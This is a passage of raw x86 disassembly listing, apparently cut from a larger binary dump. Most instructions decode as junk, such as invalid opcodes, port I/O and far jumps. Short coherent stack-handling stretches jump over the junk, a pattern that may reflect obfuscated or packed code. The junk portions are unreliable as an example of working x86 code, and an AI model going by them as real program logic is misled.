  402128:	jnp    0x40217c
  40212a:	sbb    ch,bh
  40212c:	cmc    
  40212d:	mov    ebx,0x428a670e
  402132:	mov    esi,0x6f3eac66
  402137:	push   DWORD PTR [ecx]
  402139:	in     al,dx
  40213a:	lock fidiv DWORD PTR [ebp-0xe00e8da]
  402141:	lods   al,BYTE PTR ds:[esi]
  402142:	cmp    dl,0x23
  402145:	dec    ebx
  402146:	mov    al,0xb1
  402148:	pop    ss
  402149:	stc    
  40214a:	jae    0x402171
  40214c:	imul   ebx,DWORD PTR [edx],0x458b50fd
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	sub    al,0xbf
  40216b:	js     0x402104
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402184
  402176:	aam    0x6
  402178:	mul    DWORD PTR [edx+0x234dba07]
  40217e:	jmp    0x402161
  402180:	ja     0x402199
  402182:	and    eax,0x332cf8f5
  402187:	mov    esi,DWORD PTR [eax]
  402189:	leave  
  40218a:	adc    DWORD PTR [ebx],esp
  40218c:	push   ebp
  40218d:	xor    dl,BYTE PTR ds:0x8ec9a278
  402193:	lea    ebx,[ebp+0x2fbcb58e]
  402199:	dec    ebp
  40219a:	repz into 
  40219c:	leave  
  40219d:	bnd jge 0x402130
  4021a0:	fnstsw WORD PTR [eax]
  4021a2:	stos   BYTE PTR es:[edi],al
  4021a3:	pop    ebx
  4021a4:	push   ebx
  4021a5:	in     al,0x3a
  4021a7:	sub    BYTE PTR [edx+0x26],0x4
  4021ab:	jb     0x4021d2
  4021ad:	nop
  4021ae:	(bad)  
  4021af:	lods   al,BYTE PTR ds:[esi]
  4021b0:	push   cs
  4021b1:	dec    DWORD PTR [esi-0x3d0f7f0b]
  4021b7:	xchg   esp,eax
  4021b8:	or     ecx,esi
  4021ba:	cmp    bl,bl
  4021bc:	pop    es
  4021bd:	frstor [edi]
  4021bf:	lods   al,BYTE PTR ds:[esi]
  4021c0:	addr16 mov ch,0xea
  4021c3:	outs   dx,DWORD PTR ds:[esi]
  4021c4:	dec    esi
  4021c5:	xchg   edi,edx
  4021c7:	test   al,0xca
  4021c9:	lahf   
  4021ca:	adc    DWORD PTR [eax+ebp*4],ecx
  4021cd:	pop    eax
  4021ce:	mov    dl,0x13
  4021d0:	sub    ch,BYTE PTR cs:[edi]
  4021d3:	push   0x31
  4021d5:	mov    ss:0xa20b735c,al
  4021db:	fsubr  QWORD PTR [eax+0x74d61481]
  4021e1:	jmp    0xf5f0:0x2009ef2e
  4021e8:	and    ah,dl
  4021ea:	cld    
  4021eb:	scas   eax,DWORD PTR es:[edi]
  4021ec:	sbb    al,0x2f
  4021ee:	sbb    bh,BYTE PTR [edi+0x668b84f6]
  4021f4:	and    ecx,DWORD PTR [eax+ecx*2-0x17]
  4021f8:	ffreep st(3)
  4021fa:	or     DWORD PTR [ebp-0x1c],edi
  4021fd:	in     al,dx
  4021fe:	ret    
  4021ff:	je     0x4021a5
  402201:	mov    cl,0x68
  402203:	retf   
  402204:	in     al,0x2f
  402206:	hlt    
  402207:	mov    eax,ds:0xbccf325d
  40220c:	cs (bad) 
  40220e:	sbb    BYTE PTR [eax+0x144d4324],bh
  402214:	outs   dx,BYTE PTR ds:[esi]
  402215:	lds    esi,FWORD PTR [edi+edi*8-0x59]
  402219:	mov    dh,0xc1
  40221b:	test   eax,0xa92edd67
  402220:	pop    ecx
  402221:	mov    ebx,0xdf1ab110
  402226:	arpl   ax,ax
  402228:	add    al,0x49
  40222a:	pop    ebx
  40222b:	jg     0x40229a
  40222d:	dec    ebp
  40222e:	hlt    
  40222f:	daa    
  402230:	in     eax,0xb9
  402232:	jnp    0x4021b4
  402234:	push   0x817c0320
  402239:	mov    cs,WORD PTR [ebx-0x6992fc6e]
  40223f:	mov    ah,cl
  402241:	popa   
  402242:	mov    DWORD PTR [eax-0x1afcf769],edi
  402248:	adc    eax,0x9e0e09ce
  40224d:	std    
  40224e:	dec    ebp
  40224f:	cmp    DWORD PTR [edi],esp
  402251:	imul   esi,DWORD PTR [edi+ebx*8-0x1d0047a3],0xd66c488
  40225c:	inc    eax
  40225d:	mov    dh,0x95
  40225f:	or     eax,0x4e29815e
  402264:	aaa    
  402265:	loopne 0x4022c0
  402267:	cmp    ebp,DWORD PTR [eax+ebp*8]
  40226a:	mov    al,ds:0xa071eede
  40226f:	inc    ecx
  402270:	push   esp
  402271:	cli    
  402272:	mov    eax,ds:0x6a62a19c
  402277:	mov    cl,0x9d
  402279:	mov    eax,ds:0xe97983b0
  40227e:	sbb    dl,BYTE PTR [edi+0x56]
  402281:	dec    edi
  402282:	dec    ebx
  402283:	mov    bh,0x8e
  402285:	arpl   WORD PTR [edi+0xa],ax
  402288:	adc    eax,0xa8d3a26d
  40228d:	fdiv   QWORD PTR [eax+0x6c]
  402290:	mov    ch,0x10
  402292:	push   edi
  402293:	xor    BYTE PTR [edi+0x72],cl
  402296:	adc    cl,bl
  402298:	out    dx,eax
  402299:	scas   eax,DWORD PTR es:[edi]
  40229a:	lds    ecx,FWORD PTR cs:[esi]
  40229d:	and    BYTE PTR [esp+ecx*8+0x19ed2954],bl
  4022a4:	scas   al,BYTE PTR es:[edi]
  4022a5:	or     al,0x23
  4022a7:	xchg   edi,edx
  4022a9:	inc    ebp
  4022aa:	inc    edx
  4022ab:	imul   eax,DWORD PTR [edx+0x37],0xf183d8c0
  4022b2:	sbb    eax,0xbd986a6
  4022b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b8:	lahf   
  4022b9:	push   0xffffff99
  4022bb:	(bad)  
  4022bc:	les    edi,FWORD PTR [ecx-0x6a]
  4022bf:	stos   BYTE PTR es:[edi],al
  4022c0:	movups xmm3,xmm0
  4022c3:	xchg   ebx,eax
  4022c4:	shr    DWORD PTR ds:0x494b449b,cl
  4022ca:	leave  
  4022cb:	add    al,cl
  4022cd:	xchg   BYTE PTR [esi+ecx*1+0x5505d6af],al
  4022d4:	pop    es
  4022d5:	add    al,0xac
  4022d7:	xchg   ebp,eax
  4022d8:	xchg   ebx,eax
  4022d9:	pop    esp
  4022da:	sub    ebx,DWORD PTR [ecx-0x189ac1ab]
  4022e0:	es mov dl,0xbd
  4022e3:	ins    DWORD PTR es:[edi],dx
  4022e4:	mov    ecx,DWORD PTR [edi]
  4022e6:	outs   dx,DWORD PTR ds:[esi]
  4022e7:	mov    edx,0x7951296c
  4022ec:	xor    bh,ch
  4022ee:	adc    ah,BYTE PTR [ecx-0x77]
  4022f1:	pop    esi
  4022f2:	pop    esp
  4022f3:	cmovbe esp,DWORD PTR [eax+edi*1-0x74af2582]
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	cli    
  402358:	out    dx,eax
  402359:	sbb    al,0x53
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x4023ce
  402364:	pop    ss
  402365:	adc    DWORD PTR [esi+edi*8+0x54],ebp
  402369:	mov    dh,0x23
  40236b:	ds pop eax
  40236d:	push   0x86c4dd02
  402372:	das    
  402373:	dec    edx
  402374:	daa    
  402375:	inc    edi
  402376:	les    ebx,FWORD PTR ds:0xcd1c7181
  40237c:	popf   
  40237d:	mov    cs,ebx
  40237f:	aaa    
  402380:	jno    0x402304
  402382:	outs   dx,DWORD PTR ds:[esi]
  402383:	add    ebp,0xadb45418
  402389:	xchg   ecx,eax
  40238a:	cmp    DWORD PTR [ecx],0x64b93cd3
  402390:	ror    BYTE PTR [ebx-0x7a],0xd0
  402394:	jns    0x4023f1
  402396:	or     DWORD PTR [edi],ecx
  402398:	sbb    al,0xe
  40239a:	in     al,dx
  40239b:	popa   
  40239c:	jne    0x40241d
  40239e:	adc    ecx,DWORD PTR [eax+0x35]
  4023a1:	mov    edx,eax
  4023a3:	mov    eax,0x81d7f1ae
  4023a8:	inc    ebx
  4023a9:	ret    0xe29f
  4023ac:	les    esi,FWORD PTR fs:[esi]
  4023af:	or     esi,ebx
  4023b1:	cld    
  4023b2:	clc    
  4023b3:	add    al,0x76
  4023b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023b6:	or     al,dl
  4023b8:	add    BYTE PTR [ecx+eax*8+0x13da0e5c],0xf7
  4023c0:	or     DWORD PTR [ebx+0x4b934c4d],esp
  4023c6:	jmp    0x2bb4:0xfb59a185
  4023cd:	leave  
  4023ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023cf:	fcom   DWORD PTR [esi+0x1863d99b]
  4023d5:	cmc    
  4023d6:	push   ss
  4023d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d8:	xor    dl,BYTE PTR [ebp+0x7c4a9ac5]
  4023de:	xor    eax,0x2de24762
  4023e3:	sub    ecx,DWORD PTR [esi]
  4023e5:	mov    esp,0xac689dbb
  4023ea:	test   eax,0x1b62efe3
  4023ef:	neg    BYTE PTR [esi-0x74]
  4023f2:	jb     0x4023d1
  4023f4:	ja     0x40243d
  4023f6:	push   ecx
  4023f7:	repz rcl BYTE PTR [eax],0x4b
  4023fb:	mov    al,0x17
  4023fd:	xor    eax,0xccc5314b
  402402:	xor    BYTE PTR [ecx+0x2c],dh
  402405:	mov    al,ds:0x2ed300ba
  40240a:	repz jge 0x4023ec
  40240d:	add    BYTE PTR [edx],dl
  40240f:	outs   dx,DWORD PTR ds:[esi]
  402410:	popf   
  402411:	adc    esp,ebx
  402413:	push   cs
  402414:	ss clc 
  402416:	sbb    esi,ecx
  402418:	retf   0xb5f3
  40241b:	retf   0xd96f
  40241e:	lods   al,BYTE PTR ds:[esi]
  40241f:	inc    ebx
  402420:	(bad)  
  402421:	push   eax
  402422:	clc    
  402423:	jge    0x40244a
  402425:	lahf   
  402426:	cwde   
  402427:	dec    ecx
  402428:	cli    
  402429:	arpl   WORD PTR [edi],di
  40242b:	jmp    0x9704:0x5e5f13c
  402432:	pop    ss
  402433:	mov    ss,WORD PTR ds:0x29dbdcb3
  402439:	mov    cl,0x51
  40243b:	stos   BYTE PTR es:[edi],al
  40243c:	mov    cl,0xb1
  40243e:	add    ebx,DWORD PTR [esp+esi*1+0x3e]
  402442:	int    0xc6
  402444:	dec    ecx
  402445:	call   0x7a078fc1
  40244a:	sbb    al,0x43
  40244c:	jg     0x40240e
  40244e:	arpl   WORD PTR [eax],bx
  402450:	pop    es
  402451:	or     eax,0xaa0b8e54
  402456:	cmp    edx,DWORD PTR [esi-0x34f3045a]
  40245c:	sbb    bl,BYTE PTR [edi]
  40245e:	inc    ecx
  40245f:	cmp    DWORD PTR [edx],0x41
  402462:	add    eax,0xe00912c5
  402467:	mov    eax,ds:0x8b323352
  40246c:	std    
  40246d:	jge    0x40246e
  40246f:	push   esi
  402470:	cmp    eax,0xa8a712d9
  402475:	mov    ds:0x3392b593,al
  40247a:	ficom  WORD PTR [edx]
  40247c:	mov    esi,0xe51bd231
  402481:	push   edx
  402482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402483:	push   edi
  402484:	push   ss
  402485:	pop    ebp
  402486:	inc    ecx
  402487:	(bad)  
  402488:	sar    DWORD PTR ds:0x81901e20,1
  40248e:	and    al,0x67
  402490:	hlt    
  402491:	retf   0x5174
  402494:	loopne 0x40248f
  402496:	jl     0x4024b7
  402498:	xchg   edx,eax
  402499:	test   DWORD PTR [edx-0x31776353],ecx
  40249f:	ret    0x76c1
  4024a2:	rol    DWORD PTR [edi+0x2a],0xc6
  4024a6:	dec    edx
  4024a7:	test   al,0x51
  4024a9:	mov    bh,0x5c
  4024ab:	loop   0x402489
  4024ad:	xchg   DWORD PTR [ebx+ebx*2-0x16],ebx
  4024b1:	(bad)  
  4024b2:	and    esi,DWORD PTR [edi]
  4024b4:	sahf   
  4024b5:	xchg   edi,eax
  4024b6:	imul   edx,DWORD PTR [esi-0x747b9844],0xffffff96
  4024bd:	sahf   
  4024be:	test   al,0xbc
  4024c0:	(bad)  [edi]
  4024c2:	pushf  
  4024c3:	inc    ebp
  4024c4:	or     DWORD PTR [edi],0x40f6335
  4024ca:	call   0xcbd9:0x1f949558
  4024d1:	mov    edi,0x7013a3c2
  4024d6:	push   ebp
  4024d7:	push   cs
  4024d8:	push   edi
  4024d9:	out    0x6f,eax
  4024db:	sub    ch,BYTE PTR [esi-0x54]
  4024de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e0:	stc    
  4024e1:	(bad)  
  4024e3:	aad    0x38
  4024e5:	push   es
  4024e6:	push   ecx
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	retf   0xac6
  402510:	xor    BYTE PTR [esi],ah
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402559
  40251a:	lds    edx,FWORD PTR [ecx]
  40251c:	fnstcw WORD PTR [esi-0x6fb32ed8]
  402522:	(bad)  
  402523:	inc    esi
  402524:	adc    BYTE PTR [edi-0x96efe01],bl
  40252a:	icebp  
  40252b:	and    esp,edi
  40252d:	sub    BYTE PTR gs:[esi],0xfa
  402531:	rcl    cl,1
  402533:	sbb    cl,ah
  402535:	cmp    al,0x9e
  402537:	pusha  
  402538:	pushf  
  402539:	and    esp,DWORD PTR [edi]
  40253b:	push   0x44
  40253d:	push   ebp
  40253e:	jb     0x402525
  402540:	and    bl,ah
  402542:	(bad)  
  402543:	fsubr  st(7),st
  402545:	ds retf 
  402547:	mov    cl,BYTE PTR [esi-0x33]
  40254a:	lock ja 0x4025ad
  40254d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40254e:	ret    0xe5d9
  402551:	sub    ch,BYTE PTR [esi+0x5a]
  402554:	xchg   edi,eax
  402555:	fnstcw WORD PTR [ebx-0x30]
  402558:	dec    edx
  402559:	jae    0x4025cc
  40255b:	fs inc esi
  40255d:	dec    esp
  40255e:	add    ah,cl
  402560:	xchg   ebx,eax
  402561:	fld    TBYTE PTR [ecx-0xc]
  402564:	sti    
  402565:	jp     0x40255a
  402567:	popf   
  402568:	into   
  402569:	xchg   esi,eax
  40256a:	ret    0x4345
  40256d:	cmp    eax,0x43259a68
  402572:	fwait
  402573:	inc    esp
  402574:	lock push edi
  402576:	fyl2xp1 
  402578:	fiadd  WORD PTR es:[ebp-0x6ab75f1c]
  40257f:	fstp   TBYTE PTR [esi+ebx*4]
  402582:	xchg   ecx,eax
  402583:	data16 das 
  402585:	push   ecx
  402586:	push   esi
  402587:	mov    ds:0x6276c847,al
  40258c:	jne    0x4025dd
  40258e:	retf   0x3ce5
  402591:	dec    esp
  402592:	mov    cs,WORD PTR [edx-0x6bc058a4]
  402598:	jae    0x4025c1
  40259a:	and    al,0x2c
  40259c:	lea    ebp,[esi-0x74dffaef]
  4025a2:	sub    al,BYTE PTR [ebp+0xc576cc9]
  4025a8:	pop    edx
  4025a9:	es sub eax,0x15e8bbf1
  4025af:	in     al,dx
  4025b0:	or     eax,0x9570c409
  4025b5:	xor    eax,0x99e136cd
  4025ba:	push   edx
  4025bb:	mov    WORD PTR [edi+0x2a6ab439],fs
  4025c1:	call   0x90a6e5b2
  4025c6:	and    eax,0x4f64ec16
  4025cb:	into   
  4025cc:	xchg   DWORD PTR [edi-0x193d5fdc],ecx
  4025d2:	enter  0xf7ca,0x52
  4025d6:	das    
  4025d7:	jne    0x402589
  4025d9:	jecxz  0x402579
  4025db:	lahf   
  4025dc:	hlt    
  4025dd:	push   cs
  4025de:	fiadd  DWORD PTR [ebp+0x4e281d70]
  4025e4:	(bad)  
  4025e5:	push   ds
  4025e6:	sub    BYTE PTR [edx-0x50],al
  4025e9:	fcom   DWORD PTR ds:0xa9afa3ba
  4025ef:	iret   
  4025f0:	fsubr  DWORD PTR [ebx]
  4025f2:	shl    BYTE PTR [edi],cl
  4025f4:	inc    ecx
  4025f5:	jno    0x4025c7
  4025f7:	adc    DWORD PTR [esp+eiz*2-0x6e],edx
  4025fb:	fnsave [eax]
  4025fd:	gs aad 0xa0
  402600:	fdivr  QWORD PTR [ecx]
  402602:	sbb    BYTE PTR [esi],bh
  402604:	div    BYTE PTR [esi+0xf84e2f8]
  40260a:	call   0x3e86de30
  40260f:	dec    ebp
  402610:	jo     0x4025f7
  402612:	mov    edx,gs
  402614:	pop    edi
  402615:	mov    ds:0x6e7ea9a4,al
  40261a:	pop    ebx
  40261b:	add    DWORD PTR [edx],0x1b
  40261e:	push   edi
  40261f:	push   edx
  402620:	sbb    ch,cl
  402622:	iret   
  402623:	scas   al,BYTE PTR es:[edi]
  402624:	pop    es
  402625:	pop    edi
  402626:	enter  0x4f08,0x9f
  40262a:	inc    ebp
  40262b:	and    BYTE PTR [ecx],cl
  40262d:	and    dh,BYTE PTR [ebx-0x64]
  402630:	call   FWORD PTR [ebx]
  402632:	in     al,dx
  402633:	in     al,dx
  402634:	stos   DWORD PTR es:[edi],eax
  402635:	retf   
  402636:	mov    al,ds:0x699e3ddd
  40263b:	dec    ebp
  40263c:	fwait
  40263d:	ins    DWORD PTR es:[edi],dx
  40263e:	pop    ds
  40263f:	mov    bh,0x1a
  402641:	push   es
  402642:	xchg   esp,eax
  402643:	add    DWORD PTR [eax+0x1b],esi
  402646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402647:	mov    esp,0xcbea266d
  40264c:	adc    ebx,DWORD PTR [ecx-0x7f8c321b]
  402652:	(bad)  
  402653:	cmp    eax,0xc2ba41f3
  402658:	dec    ecx
  402659:	mov    esi,0x20877574
  40265e:	pop    esi
  40265f:	add    eax,0x2f48975c
  402664:	push   es
  402665:	ins    DWORD PTR es:[edi],dx
  402666:	sub    bh,BYTE PTR ds:0x5e6df3a7
  40266c:	xchg   BYTE PTR [eax+0x66],cl
  40266f:	mov    BYTE PTR [esi],bh
  402671:	dec    eax
  402672:	cmp    al,0xc1
  402674:	pop    ss
  402675:	inc    esi
  402676:	sti    
  402677:	mov    ah,0x63
  402679:	push   ds
  40267a:	into   
  40267b:	or     al,0x9f
  40267d:	std    
  40267e:	fmul   QWORD PTR [ebp-0x7e863d3a]
  402684:	push   ds
  402685:	inc    esp
  402686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402687:	lods   al,BYTE PTR ds:[esi]
  402688:	adc    dl,ch
  40268a:	adc    BYTE PTR [edx-0x76],dh
  40268d:	fimul  WORD PTR [eax]
  40268f:	jmp    0x8f78:0x5949275
  402696:	cmp    al,0x87
  402698:	sbb    dh,BYTE PTR ds:0x33d3f296
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	gs retf 
  4026d4:	fsubr  DWORD PTR [eax-0x5e]
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x402753
  4026df:	fidivr WORD PTR [eax+0x13]
  4026e2:	jb     0x402746
  4026e4:	sahf   
  4026e5:	aaa    
  4026e6:	je     0x4026c0
  4026e8:	mov    BYTE PTR [edi+0x3],bl
  4026eb:	sub    ah,dh
  4026ed:	out    dx,eax
  4026ee:	and    DWORD PTR [ebp+0x2a],ebp
  4026f1:	mov    ah,0x82
  4026f3:	repz or dh,BYTE PTR [eax]
  4026f6:	(bad)  
  4026f7:	pop    edi
  4026f8:	aas    
  4026f9:	pushf  
  4026fa:	sbb    DWORD PTR [esi+ebx*2-0x5ee58265],0xffffffe0
  402702:	and    BYTE PTR [esi+0x305a05c6],ch
  402708:	jmp    0x402724
  40270a:	lock xchg dl,al
  40270d:	pop    ecx
  40270e:	hlt    
  40270f:	mov    cl,0xb3
  402711:	cwde   
  402712:	ret    0xcaa8
  402715:	(bad)  
  402716:	pop    ds
  402717:	es jle 0x4026e4
  40271a:	cmp    eax,DWORD PTR [edx-0x68]
  40271d:	xchg   ecx,eax
  40271e:	lods   al,BYTE PTR ds:[esi]
  40271f:	cmp    DWORD PTR [ecx*4+0x5d77d3a5],ebx
  402726:	hlt    
  402727:	fisttp QWORD PTR [ecx-0x55]
  40272a:	add    bl,ch
  40272c:	sbb    DWORD PTR [ecx+0x6736956a],esp
  402732:	pushf  
  402733:	push   ebx
  402734:	jne    0x4026c9
  402736:	shr    BYTE PTR [ebx+ebp*4-0x2],1
  40273a:	int    0x7d
  40273c:	rcr    DWORD PTR [ebx+eax*2+0x29],cl
  402740:	and    eax,0xe474362f
  402745:	and    al,0x27
  402747:	ss sbb eax,0x7f990c04
  40274d:	pop    esp
  40274e:	sub    eax,0x8b69009f
  402753:	xor    al,0x17
  402755:	mov    ds:0x7f41a96,al
  40275a:	jno    0x40273f
  40275c:	jg     0x40270f
  40275e:	mov    ah,0xbd
  402760:	repnz mov esp,0x4d9a34af
  402766:	ins    BYTE PTR es:[edi],dx
  402767:	fisttp DWORD PTR [edi]
  402769:	cwde   
  40276a:	sub    cl,BYTE PTR ds:0x6a7e3555
  402770:	push   esp
  402771:	or     al,al
  402773:	add    DWORD PTR [eax],esp
  402775:	jno    0x40276a
  402777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402778:	xor    BYTE PTR [eax+0x2964e7f1],bh
  40277e:	ins    DWORD PTR es:[edi],dx
  40277f:	cmp    BYTE PTR [ebx-0x38],0x4d
  402783:	enter  0x99cb,0xc1
  402787:	xchg   BYTE PTR [ecx],bh
  402789:	push   esp
  40278a:	and    ebx,eax
  40278c:	sahf   
  40278d:	(bad)  ss:[ebx-0x60]
  402791:	jle    0x402747
  402793:	stc    
  402794:	adc    esi,ecx
  402796:	fst    DWORD PTR [bp+si]
  402799:	or     al,0x28
  40279b:	jb     0x402731
  40279d:	stc    
  40279e:	(bad)  
  40279f:	mov    ds:0x1f3b40a5,ax
  4027a5:	and    ebx,0xffffffa9
  4027a8:	stos   DWORD PTR es:[edi],eax
  4027a9:	mov    eax,DWORD PTR [eax+0x5507ea]
  4027af:	aam    0x48
  4027b1:	add    eax,0x9e6bb293
  4027b6:	addr16 pop esp
  4027b8:	pop    esi
  4027b9:	sbb    al,0x67
  4027bb:	sbb    eax,0xa7a8ae65
  4027c0:	xor    BYTE PTR [ecx-0x43],ch
  4027c3:	in     eax,0xa4
  4027c5:	adc    ecx,edi
  4027c7:	loopne 0x40283f
  4027c9:	push   edi
  4027ca:	aam    0x7a
  4027cc:	mov    cs,WORD PTR [esp+esi*4-0x1a]
  4027d0:	push   ebp
  4027d1:	mov    ah,0x9d
  4027d3:	daa    
  4027d4:	xor    eax,0x81a1bea1
  4027d9:	addr16 push esp
  4027db:	or     al,0xb0
  4027dd:	mov    ch,0xe5
  4027df:	mov    dh,0x7a
  4027e1:	les    ecx,FWORD PTR [edx-0x2a]
  4027e4:	lock push ebx
  4027e6:	fs aad 0xbe
  4027e9:	mov    ds,edx
  4027eb:	ret    0x36e3
  4027ee:	inc    ecx
  4027f0:	mov    WORD PTR [esi+0x4626a999],?
  4027f6:	sub    BYTE PTR [edi-0x10],0xcd
  4027fa:	mov    ebx,0x8e9c585
  4027ff:	push   ss
  402800:	adc    esp,DWORD PTR [ebx-0xf9ec229]
  402806:	add    eax,0x625a7122
  40280b:	je     0x4027a8
  40280d:	pop    ebx
  40280e:	les    esi,FWORD PTR ds:0x780713de
  402814:	dec    edi
  402815:	pop    edi
  402816:	sti    
  402817:	fldcw  WORD PTR [ebx]
  402819:	jmp    0xb82f:0xf4d9c9fb
  402820:	xor    eax,0x13f03939
  402825:	shl    BYTE PTR [edi],1
  402827:	fdiv   QWORD PTR [ebx+edi*2]
  40282a:	jbe    0x4027df
  40282c:	sbb    ebp,DWORD PTR [esi]
  40282e:	xor    edi,0x93a484ce
  402834:	add    al,0x55
  402836:	fistp  DWORD PTR [esi+ebp*1+0x704229f2]
  40283d:	(bad)  
  40283f:	dec    esp
  402840:	in     al,dx
  402841:	aas    
  402842:	int    0x30
  402844:	rol    BYTE PTR [edi+0x68],0x16
  402848:	xor    ch,BYTE PTR [edx+0x64ede6f4]
  40284e:	sbb    esi,0x22bd3c6f
  402854:	add    BYTE PTR [eax-0x1d8282d8],bh
  40285a:	sub    ebx,DWORD PTR cs:[edi-0x69902e79]
  402861:	inc    ebp
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	daa    
  402884:	sbb    al,0x70
  402886:	xchg   esi,eax
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028aa
  402890:	jg     0x40284f
  402892:	push   eax
  402893:	inc    esp
  402894:	inc    ebp
  402895:	push   DWORD PTR [ecx-0x37]
  402898:	xchg   edi,eax
  402899:	or     eax,0x5ea2503d
  40289e:	das    
  40289f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a0:	adc    ebx,DWORD PTR [ecx]
  4028a2:	pop    edi
  4028a3:	into   
  4028a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a5:	into   
  4028a6:	or     al,BYTE PTR [edi]
  4028a8:	add    eax,0x2d5556f1
  4028ad:	sub    BYTE PTR [ebx+eiz*4],dh
  4028b0:	in     al,0xfe
  4028b2:	xor    BYTE PTR [eax-0x23971f09],ah
  4028b8:	jmp    0x7e9b:0xce8ba282
  4028bf:	lods   eax,DWORD PTR ds:[esi]
  4028c0:	or     BYTE PTR [ebx+0x6c],dh
  4028c3:	aad    0x71
  4028c5:	sbb    ecx,ecx
  4028c7:	fcom   QWORD PTR [edi]
  4028c9:	or     al,0x2f
  4028cb:	mov    ebx,0x73a29438
  4028d0:	inc    ecx
  4028d1:	inc    eax
  4028d2:	adc    ah,BYTE PTR [edi-0x6]
  4028d5:	pusha  
  4028d6:	sar    DWORD PTR [eax-0x67305a79],0x61
  4028dd:	cmp    DWORD PTR [edx],ebp
  4028df:	(bad)  
  4028e0:	cmp    al,0xe1
  4028e2:	sub    eax,0x5bd7cd04
  4028e7:	pop    es
  4028e8:	and    DWORD PTR [esi+ebx*2],ecx
  4028eb:	cwde   
  4028ec:	cwde   
  4028ed:	add    ebp,esi
  4028ef:	sub    al,0x86
  4028f1:	sub    eax,0x679562de
  4028f6:	aam    0x2e
  4028f8:	mov    ebx,0x8365cc18
  4028fd:	mov    ebx,0x18884bfb
  402902:	loopne 0x4028d2
  402904:	das    
  402905:	lods   eax,DWORD PTR ds:[esi]
  402906:	mov    edx,0xc6e68c40
  40290b:	ret    
  40290c:	outs   dx,BYTE PTR ds:[esi]
  40290d:	test   al,0xb3
  40290f:	inc    edx
  402910:	jno    0x4028b9
  402912:	fcom   DWORD PTR [ecx]
